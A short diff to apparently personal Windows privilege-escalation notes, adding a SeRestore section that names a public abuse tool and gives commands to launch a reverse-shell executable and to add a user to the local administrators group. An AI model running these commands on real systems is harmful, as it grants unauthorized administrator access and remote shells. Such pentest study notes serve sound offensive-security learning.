@@ -8,7 +8,19 @@ https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/Enable
 
 ## Examples of dangerous privileges:
 
-### SeBackup/SeRestore
+### SeRestore
+
+Tool: https://github.com/xct/SeRestoreAbuse
+
+#### 1: Transfer files on victim system, then:
+
+    SeRestoreAbuse.exe "cmd /c C:\users\user\reverse.exe"
+
+OR add our user to local administrators group, then connect with psexec
+
+    SeRestoreAbuse.exe "cmd /c net localgroup administrators user /add"
+
+### SeBackup
 
 #### 1: Backup SAM and SYSTEM hashes
 
